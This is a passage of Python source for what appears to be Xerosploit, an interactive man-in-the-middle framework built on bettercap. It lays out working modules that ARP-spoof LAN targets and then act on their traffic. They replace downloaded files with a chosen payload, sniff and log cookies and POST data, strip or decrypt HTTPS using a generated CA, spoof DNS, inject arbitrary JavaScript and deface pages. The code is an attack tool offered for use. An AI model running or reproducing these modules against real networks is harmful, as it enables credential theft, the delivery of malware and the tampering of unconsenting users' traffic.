								sys.exit(exit_msg)	
							elif action_rdownload == "home":
								home()
							elif action_rdownload == "run":
								print("\033[1;32m\n[+] Specify the extension of the files to replace. (e.g. exe)\n\033[1;m")
								ext_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip().lstrip(".")
								if not ext_rdownload or not re.match(r"^[A-Za-z0-9]{1,10}$", ext_rdownload):
									print("\033[1;91m\n[!] Invalid extension. Use e.g. 'exe'.\033[1;m")
									rdownload()
									return
								print("\033[1;32m\n[+] Set the file to use in order to replace the ones matching the extension.\n\033[1;m")
								file_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m")
								file_rdownload = expand_path(file_rdownload)
								if file_rdownload == "back":
									rdownload()
								elif file_rdownload == "home":
									home()
								elif file_rdownload == "exit":
									sys.exit(exit_msg)
								else:
									if not os.path.isfile(file_rdownload):
										print("\033[1;91m\n[!] File not found: '%s'.\033[1;m" % file_rdownload)
										rdownload()
										return
									if not check_netconfig():
										rdownload()
										return
									print("\033[1;34m\n[++] All ." + ext_rdownload + " files will be replaced by " + file_rdownload + "  \033[1;m")
									print("\033[1;33m[!] Note: only works on plain HTTP downloads (not HTTPS).\n\033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									staged = stage_file(file_rdownload, "replace.bin")
									if staged is None:
										rdownload()
										return
									js_path = stage_js("rdownload.js", {"__EXT__": ext_rdownload,
									                                   "__REPLACE_FILE__": js_quote(staged)})
									if js_path is None:
										rdownload()
										return
									eval_cmds = (["set http.proxy.script " + js_path, "http.proxy on"]
									             + bc_spoof_eval(target_ips))
									cmd_rdownload = os.system(bc_cmd(eval_cmds))
									rdownload()						
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								rdownload()
						rdownload()
					elif options == "sniff":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           Sniffing                           █
█                                                              █
█      Capturing any data passed over your local network       █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")

						def snif():
							print("\033[1;32m\n[+] Please type 'run' to execute the 'sniff' command.\n\033[1;m")
							action_snif = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_snif == "back":
								option()
							elif action_snif == "exit":
								sys.exit(exit_msg)	
							elif action_snif == "home":
								home()
							elif action_snif == "run":
								def snif_sslstrip():

									print("\033[1;32m\n[+] Do you want to load sslstrip ? (y/n).\n\033[1;m")
									print("\033[1;33m[!] 'y' = intercept HTTP and downgrade HTTPS "
									      "(needs our CA trusted on the victim, see below).\n"
									      "    'n' = passive sniffing, plain HTTP traffic only.\n"
									      "    Preloaded-HSTS sites and pinned apps cannot be "
									      "downgraded without a trusted CA.\n\033[1;m")
									action_snif_sslstrip = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
									if not check_netconfig():
										snif()
										return
									safe_target = re.sub(r"[^A-Za-z0-9_.-]", "_", target_ips) or "all"

									def _run_sniff(sslstrip_on):
										print("\033[1;34m\n[++] All logs are saved on : " + xe_path("xerosniff") + " \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										if sslstrip_on:
											print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m (HTTP proxy + HTTPS intercept)\033[1;m")
										else:
											print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m (passive ARP sniffing)\033[1;m")
										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
										print("\033[1;33m[!] The log window stays empty until the target "
										      "generates traffic — open a page on the victim "
										      "to see data (issues #147/#274).\n\033[1;m")

										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										date = date.replace("\n","").strip().replace(" ", "_")
										filename = safe_target + date
										filename = filename.replace("\n","")
										sniff_dir = xe_path("xerosniff")
										log_path = os.path.join(sniff_dir, filename + ".log")
										pcap_path = os.path.join(sniff_dir, filename + ".pcap")
										try:
											os.makedirs(sniff_dir, exist_ok=True)
											_orig_open(log_path, "a").close()
										except Exception as e:
											print("\033[1;91m[!] Cannot write sniff log: %s\033[1;m" % e)
										if shutil.which("xterm"):
											cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f """ + shell_quote(log_path) + """  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|GET|$'" > /dev/null 2>&1 &""")
										else:
											print("\033[1;33m[!] 'xterm' not found, tail the log manually: %s\033[1;m" % log_path)
										# bettercap v2 runs its event stream from boot, so the
										# log file only takes effect after a restart.
										eval_cmds = ["events.stream off",
										             "set events.stream.output " + log_path,
										             "set events.stream.http.request.dump true",
										             "events.stream on"]
										if sslstrip_on:
											# Terminate victim TLS as well (port 443): with our
											# CA trusted on the victim this decrypts HTTPS, so
											# sniffing works there too. Without a trusted CA,
											# HTTPS fails closed on the victim (expected TLS
											# behavior, not a bug). Our CA is long-lived
											# (10 years); bettercap's auto-generated one lasts
											# ~1 year, so prefer ours when available.
											ca_crt, ca_key = ensure_ca()
											eval_cmds += ["set http.proxy.sslstrip true",
											              "http.proxy on"]
											if ca_crt:
												eval_cmds += ["set https.proxy.certificate " + ca_crt,
												              "set https.proxy.key " + ca_key]
												print("\033[1;34m\n[++] HTTPS interception ON with CA:\n     %s\033[1;m" % ca_crt)
											else:
												print("\033[1;33m[!] Using bettercap's own short-lived CA.\033[1;m")
											eval_cmds += ["https.proxy on"]
											ca_file = ca_crt or os.path.expanduser("~/.bettercap-ca.cert.pem")
											print("\033[1;34m[++] Victim must trust CA:\n     %s\033[1;m" % ca_file)
											print("\033[1;34m[++] Install it in the victim browser/OS store "
											      "(lab: curl --cacert <ca.pem> https://...).\033[1;m")
										eval_cmds += ["set net.sniff.output " + pcap_path,
										              "net.sniff on"]
										eval_cmds += bc_spoof_eval(target_ips)
										cmd_snif = os.system(bc_cmd(eval_cmds))
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm " + shell_quote(os.path.join(sniff_dir, filename + ".*")))
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] Logs have been saved. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
												snifflog()
										snifflog()

									if action_snif_sslstrip == "y":
										_run_sniff(True)

									elif action_snif_sslstrip == "n":
										_run_sniff(False)

									elif action_snif == "back":
										snif()
									elif action_snif == "exit":
										sys.exit(exit_msg)	
									elif action_snif == "home":
										home()
									else:
										print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
										snif_sslstrip()
								snif_sslstrip()
							
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								snif()

						snif()

					elif options == "dspoof":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         DNS spoofing                         █
█                                                              █
█   Supply false DNS information to all target browsed hosts   █
█     Redirect all the http traffic to the specified one IP    █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'dspoof' command.\n\033[1;m")
							action_dspoof = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_dspoof == "back":
								option()
							elif action_dspoof == "exit":
								sys.exit(exit_msg)	
							elif action_dspoof == "home":
								home()
							elif action_dspoof == "run":
								print("\033[1;32m\n[+] Enter the IP address where you want to redirect the traffic.\n\033[1;m")
								action_dspoof_ip = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", action_dspoof_ip):
									print("\033[1;91m\n[!] Invalid IP address: '%s'.\033[1;m" % action_dspoof_ip)
									dspoof()
									return
								if not check_netconfig():
									dspoof()
									return
								if action_dspoof_ip.startswith("127."):
									print("\033[1;33m[!] Redirecting to loopback (%s) makes every "
									      "domain resolve locally on the victim — pages will fail "
									      "to load (issue #298). Use your LAN IP instead.\033[1;m" % action_dspoof_ip)
								# bettercap v2 takes plain domain names (a domain also
								# matches its subdomains); empty input spoofs ALL
								# domains via dns.spoof.all (issue #5).
								print("\033[1;32m\n[+] Which domain to spoof? Empty = ALL domains.\n[+] Example: facebook.com\n\033[1;m")
								domain_pat = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								domains, use_all = dns_domains(domain_pat)
								if not use_all and not re.match(r"^[A-Za-z0-9.,_*-]+$", domains):
									print("\033[1;91m\n[!] Invalid domain '%s'.\033[1;m" % domain_pat)
									dspoof()
									return

								print("\033[1;34m\n[++] Redirecting '%s' to %s ... \033[1;m" % (domain_pat or "ALL", action_dspoof_ip))
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

								eval_cmds = []
								if use_all:
									eval_cmds.append("set dns.spoof.all true")
								else:
									eval_cmds.append("set dns.spoof.domains " + domains)
								eval_cmds.append("set dns.spoof.address " + action_dspoof_ip)
								eval_cmds.append("dns.spoof on")
								eval_cmds += bc_spoof_eval(target_ips)
								cmd_dspoof = os.system(bc_cmd(eval_cmds))
								dspoof()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dspoof()
						dspoof()
					elif options == "yplay":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            Yplay                             █
█                                                              █
█    PLay youtube videos as background sound in all webpages   █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def yplay():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'yplay' command.\n\033[1;m")
							action_yplay = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_yplay == "back":
								option()
							elif action_yplay == "exit":
								sys.exit(exit_msg)	
							elif action_yplay == "home":
								home()
							elif action_yplay == "run":
								print("\033[1;32m\n[+] Insert a youtube video ID. (e.g. NvhZu5M41Z8)\n\033[1;m")
								print("\033[1;33m[!] Note: only works on plain HTTP pages, not HTTPS (most sites today).\n\033[1;m")
								video_id = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
								if video_id == "back":
									option()
								elif video_id == "": # if raw = null
									print("\033[1;91m\n[!] Error : Please specify your video ID.\033[1;m")
									yplay()
								elif video_id == "exit":
									sys.exit(exit_msg)	
								elif video_id == "home":
									home()
								else:
									# Validate to fail fast instead of "stopping automatically" (issues #349/#350).
									if not re.match(r"^[A-Za-z0-9_-]{11}$", video_id):
										print("\033[1;91m\n[!] Invalid YouTube ID '%s'. It must be 11 chars (letters, digits, - _).\n"
										      "[!] Example: NvhZu5M41Z8\033[1;m" % video_id)
										yplay()
										return
									if not check_netconfig():
										yplay()
										return
									js_path = stage_js("yplay.js", {"__VIDEO_ID__": video_id})
									if js_path is None:
										yplay()
										return
									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									eval_cmds = (["set http.proxy.script " + js_path, "http.proxy on"]
									             + bc_spoof_eval(target_ips))
									cmd_yplay = os.system(bc_cmd(eval_cmds))
									yplay()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								yplay()
						yplay()


					elif options == "replace":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          Image Replace                       █
█                                                              █
█        Replace all web pages images with your own one        █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def replace():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'replace' command.\n\033[1;m")
							action_replace = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_replace == "back":
								option()
							elif action_replace == "exit":
								sys.exit(exit_msg)	
							elif action_replace == "home":
								home()
							elif action_replace == "run":
								print("\033[1;32m\n[+] Insert your image path. (e.g. /home/kali/pictures/fun.png)\n\033[1;m")
								print("\033[1;33m[!] Note: only works on plain HTTP pages, not HTTPS.\n\033[1;m")
								img_replace = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
								img_replace = expand_path(img_replace)
								if img_replace == "back":
									replace()
								elif img_replace == "exit":
									sys.exit(exit_msg)	
								elif img_replace == "home":
									home()
								else:
									if not os.path.isfile(img_replace):
										print("\033[1;91m\n[!] File not found: '%s'.\033[1;m" % img_replace)
										replace()
										return
									try:
										from PIL import Image
									except ImportError:
										print("\033[1;91m\n[!] Python Pillow is missing. Install with: sudo apt-get install -y python3-pil\033[1;m")
										replace()
										return
									try:
										img = Image.open(img_replace)
										ensure_runtime_files()
										staged = stage_file(img_replace, "ximage" + os.path.splitext(img_replace)[1].lower())
										if staged is None:
											replace()
											return
									except Exception as e:
										print("\033[1;91m\n[!] Cannot process image '%s': %s\033[1;m" % (img_replace, e))
										replace()
										return
									if not check_netconfig():
										replace()
										return
									host_ip = iface_ip(up_interface)
									if not host_ip:
										print("\033[1;91m\n[!] Could not determine our IP on %s.\033[1;m" % up_interface)
										replace()
										return
									js_path = stage_js("replace_images.js",
									                   {"__IMAGE_URL__": "http://%s:8099/%s" % (host_ip, os.path.basename(staged))})
									if js_path is None:
										replace()
										return
									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

									eval_cmds = (["set http.server.path " + xe_path("tools", "bettercap2", "tmp"),
									              "set http.server.port 8099",
									              "http.server on",
									              "set http.proxy.script " + js_path,
									              "http.proxy on"]
									             + bc_spoof_eval(target_ips))
									cmd_replace = os.system(bc_cmd(eval_cmds))

									replace()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								replace()

						replace()


					elif options == "driftnet":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            Driftnet                          █
█                                                              █
█          View all images requested by your target            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'driftnet' command.\n\033[1;m")
							action_driftnet = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_driftnet == "back":
								option()
							elif action_driftnet == "exit":
								sys.exit(exit_msg)	
							elif action_driftnet == "home":
								home()
							elif action_driftnet == "run":
								if not require_cmd("driftnet", "Install with: sudo apt-get install -y driftnet"):
									driftnet()
									return
								if not check_netconfig():
									driftnet()
									return
								print("\033[1;34m\n[++] Capturing requested images on " + target_name + " ... \033[1;m")
								drift_dir = xe_path("xedriftnet")
								print("\033[1;34m\n[++] All captured images will be temporarily saved in " + drift_dir + " \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_driftnet = os.system("mkdir -p " + shell_quote(drift_dir) + " && driftnet -d " + shell_quote(drift_dir) + " > /dev/null 2>&1 &")
								# ARP-spoof so the target's image traffic flows past us
								# for driftnet to capture (plain HTTP images only).
								cmd_driftnet_sniff = os.system(bc_cmd(bc_spoof_eval(target_ips)))
								cmd_driftnet_2 = os.system("rm -rf " + shell_quote(drift_dir))
								driftnet()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								driftnet()
						driftnet()

					elif options == "move":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           Shakescreen                        █
█                                                              █
█                   Shaking Web Browser content                █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def shakescreen():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'move' command.\n\033[1;m")
							action_shakescreen = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_shakescreen == "back":
								option()
							elif action_shakescreen == "exit":
								sys.exit(exit_msg)	
							elif action_shakescreen == "home":
								home()
							elif action_shakescreen == "run":
								if not check_netconfig():
									shakescreen()
									return
								js_path = xe_path("tools", "bettercap2", "js", "shakescreen.js")
								if not os.path.isfile(js_path):
									print("\033[1;91m\n[!] Missing JS module: %s. Re-run the installer.\033[1;m" % js_path)
									shakescreen()
									return
								print("\033[1;34m\n[++] Injecting shakescreen.js  ... \033[1;m")
								print("\033[1;33m[!] Note: only works on plain HTTP pages, not HTTPS.\n\033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								staged = stage_file(js_path, "shakescreen.js")
								if staged is None:
									shakescreen()
									return
								eval_cmds = (["set http.proxy.injectjs " + staged, "http.proxy on"]
								             + bc_spoof_eval(target_ips))
								cmd_shakescreen = os.system(bc_cmd(eval_cmds))
								shakescreen()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								shakescreen()

						shakescreen()

					elif options == "injectjs":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                       Inject Javascript                      █
█                                                              █
█       Inject Javascript code in all visited webpage.         █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_j():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'injectjs' command.\n\033[1;m")
							action_inject_j = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_inject_j == "back":
								option()
							elif action_inject_j == "exit":
								sys.exit(exit_msg)	
							elif action_inject_j == "home":
								home()
							elif action_inject_j == "run":
								print("\033[1;32m\n[+] Specify the file containing js code you would like to inject.\n\033[1;m")
								print("\033[1;33m[!] Note: only works on plain HTTP pages, not HTTPS/HSTS sites.\n\033[1;m")
								js_file = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m")
								js_file = expand_path(js_file)
								if js_file == "back":
									inject_j()
								elif js_file == "exit":
									sys.exit(exit_msg)	
								elif js_file == "home":
									home()
								else:

									if not os.path.isfile(js_file):
										print("\033[1;91m\n[!] File not found: '%s'. Please specify an existing file.\033[1;m" % js_file)
										inject_j()
										return
									if not check_netconfig():
										inject_j()
										return
									print("\033[1;34m\n[++] Injecting Javascript code ... \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									staged = stage_file(js_file, "inject.js")
									if staged is None:
										inject_j()
										return
									eval_cmds = (["set http.proxy.injectjs " + staged, "http.proxy on"]
									             + bc_spoof_eval(target_ips))
									cmd_inject_j = os.system(bc_cmd(eval_cmds))
									inject_j()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								inject_j()

						inject_j()

					elif options == "deface":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                        Deface Web Page                       █
█                                                              █
█        Overwrite all web pages with your HTML code           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def deface():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'deface' command.\n\033[1;m")
							action_deface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_deface == "back":
								option()
							elif action_deface == "exit":
								sys.exit(exit_msg)	
							elif action_deface == "home":
								home()
							elif action_deface == "run":
								print("\033[1;32m\n[+] Specify the file containing your defacement code .\033[1;m")
								print("\033[1;33m\n[!] Your file should not contain Javascript code .\n\033[1;m")
								print("\033[1;33m[!] Note: only works on plain HTTP pages, not HTTPS/HSTS sites.\n\033[1;m")
								
								file_deface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m")
								
								if file_deface == "back":
									option()
								elif file_deface == "exit":
									sys.exit(exit_msg)	
								elif file_deface == "home":
									home()
								else:
									file_deface_path = expand_path(file_deface)
									if not os.path.isfile(file_deface_path):
										print("\033[1;91m\n[!] File not found: '%s'. Tip: use an absolute path "
										      "or ~/path (issue #345: 'root/...' means you forgot the leading '/').\033[1;m" % file_deface_path)
										deface()
										return
									if not check_netconfig():
										deface()
										return
									try:
										with _orig_open(file_deface_path, 'r', encoding='utf-8', errors='replace') as fh:
											file_deface_content = fh.read()
									except Exception as e:
										print("\033[1;91m\n[!] Cannot read file '%s': %s\033[1;m" % (file_deface_path, e))
										deface()
										return
									if not file_deface_content.strip():
										print("\033[1;91m\n[!] File is empty: '%s'.\033[1;m" % file_deface_path)
										deface()
										return

									print("\033[1;34m\n[++] Overwriting all web pages ... \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

									staged = stage_file(file_deface_path, "deface.html")
									if staged is None:
										deface()
										return
									js_path = stage_js("deface.js", {"__HTML_FILE__": js_quote(staged)})
									if js_path is None:
										deface()
										return
									eval_cmds = (["set http.proxy.script " + js_path, "http.proxy on"]
									             + bc_spoof_eval(target_ips))
									cmd_inject = os.system(bc_cmd(eval_cmds))
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()

						deface()

					elif options == "back":
						target_ip()	
					elif options == "exit":
								sys.exit(exit_msg)	
					elif options == "home":
						home()
					# Show disponible modules.
					elif options == "help":
						print ("")
						table_datas = [
		    				["\033[1;36m\n\n\n\n\n\n\n\n\n\n\n\n\n\nMODULES\n", """
pscan       :  Port Scanner

dos         :  DoS Attack

ping        :  Ping Request

injecthtml  :  Inject Html code

injectjs    :  Inject Javascript code

rdownload   :  Replace files being downloaded

sniff       :  Capturing information inside network packets

dspoof      :  Redirect all the http traffic to the specified one IP

yplay       :  Play background sound in target browser

replace     :  Replace all web pages images with your own one

driftnet    :  View all images requested by your targets

move        :  Shaking Web Browser content

deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
						]
						table = DoubleTable(table_datas)
						print(table.table)
						option()
					else:
						print("\033[1;91m\n[!] Error : Module not found . Type 'help' to view the modules list. \033[1;m")
						option()
				option()



			if target_ips == "back":
				home()
			elif target_ips == "exit":
								sys.exit(exit_msg)	
			elif target_ips == "home":
				home()
			elif target_ips == "help":
				table_datas = [
		    		["\033[1;36m\nInformation\n", "\nInsert your target IP address.\nMultiple targets : ip1,ip2,ip3,... \nThe 'all' command will target all your network.\n\n\033[1;m"]
				]
				table = DoubleTable(table_datas)
				print(table.table)
				target_ip()
		# if target = all the network
			elif target_ips == "all": 

				target_ips = ""
				target_name = "All your network"
				program0()

			else:
				program0()







		def cmd0():
			while True:
				print("\033[1;32m\n[+] Please type 'help' to view commands.\n\033[1;m")
				cmd_0 = input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
				if cmd_0 == "scan": # Map the network
					print("\033[1;34m\n[++] Mapping your network ... \n\033[1;m")
					scan()
				elif cmd_0 == "start": # Skip network mapping and directly choose a target.
					target_ip()
				elif cmd_0 == "gateway": # Change gateway
					def gateway():
						print("")
						table_datas = [
			    			["\033[1;36m\nInformation\n", "\nManually set  your gateway.\nInsert '0' if you want to choose your default network gateway.\n\033[1;m"]
						]
						table = DoubleTable(table_datas)
						print(table.table)

						print("\033[1;32m\n[+] Enter your network gateway.\n\033[1;m")
						n_gateway = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m").strip()
			
						if n_gateway == "back":
							home()
						elif n_gateway == "exit":
								sys.exit(exit_msg)	
						elif n_gateway == "home":
							home()
						else:

							if n_gateway != "0" and not is_valid_ipv4(n_gateway):
								print("\033[1;91m\n[!] '%s' is not a valid IPv4 address. "
								      "Example: 192.168.1.1 (or '0' for auto-detect).\033[1;m" % n_gateway)
								gateway()
								return
							ensure_runtime_files()
							s_gateway = open('/opt/xerosploit/tools/files/gateway.txt','w')
							s_gateway.write(n_gateway)
							s_gateway.close()

							home()
					gateway()

				elif cmd_0 == "iface": # Change network interface.
					def iface():
						print ("")
						table_datas = [
			    			["\033[1;36m\nInformation\n", "\nManually set your network interface.\nInsert '0' if you want to choose your default network interface.\n\033[1;m"]
						]
						table = DoubleTable(table_datas)
						print(table.table)

						print("\033[1;32m\n[+] Enter your network interface.\n\033[1;m")
						n_up_interface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m").strip()

						if n_up_interface == "back":
							home()
						elif n_up_interface == "exit":
								sys.exit(exit_msg)	
						elif n_up_interface == "home":
							home()
						else:
							if not n_up_interface or n_up_interface.startswith("-"):
								print("\033[1;91m\n[!] Invalid interface name. "
								      "Example: eth0 / wlan0 (or '0' for auto-detect).\033[1;m")
								iface()
								return
							ensure_runtime_files()
							s_up_interface = open('/opt/xerosploit/tools/files/iface.txt','w')
							s_up_interface.write(n_up_interface)
							s_up_interface.close()

							home()
					iface()		
				elif cmd_0 == "exit":
					sys.exit(exit_msg)

				elif cmd_0 == "home":
					home()

				elif cmd_0 == "rmlog": # Remove all logs
					def rm_log():
						print("\033[1;32m\n[+] Do want to remove all xerosploit logs ? (y/n)\n\033[1;m")
						cmd_rmlog = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
						if cmd_rmlog == "y":
							ensure_runtime_files()
							rmlog = os.system("rm -rf " + shell_quote(xe_path("xerosniff")) + " " + shell_quote(xe_path("tools/log/*")) + " " + shell_quote(xe_path("tools/bettercap2/tmp/*")) + " 2>/dev/null; mkdir -p " + shell_quote(xe_path("tools/log")) + " " + shell_quote(xe_path("tools/bettercap2/tmp")))
							print("\033[1;31m\n[++] All logs have been removed. \n\033[1;m")
							sleep(1)
							home()
						elif cmd_rmlog == "n":
							home()
						
						elif cmd_rmlog == "exit":
							sys.exit(exit_msg)

						elif cmd_rmlog == "home":
							home()
						elif cmd_rmlog == "back":
							home()
						else:
							print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
							rm_log()
					rm_log()	
# Principal commands
				elif cmd_0 == "help":
					print ("")
					table_datas = [
			    		["\033[1;36m\n\n\n\nCOMMANDS\n", """
scan     :  Map your network.

iface    :  Manually set your network interface.

gateway  :  Manually set your gateway.

start    :  Skip scan and directly set your target IP address.

rmlog    :  Delete all xerosploit logs.

help     :  Display this help message.

exit     :  Close Xerosploit.\n\033[1;m"""]
					]
					table = DoubleTable(table_datas)
					print(table.table)


				else:
					print("\033[1;91m\n[!] Error : Command not found.\033[1;m")


		home()			
		cmd0()


	except KeyboardInterrupt:
		print ("\n" + exit_msg)
		sleep(1)
	except Exception:
		traceback.print_exc(file=sys.stdout)
	sys.exit(0)

if __name__ == "__main__":
	main()
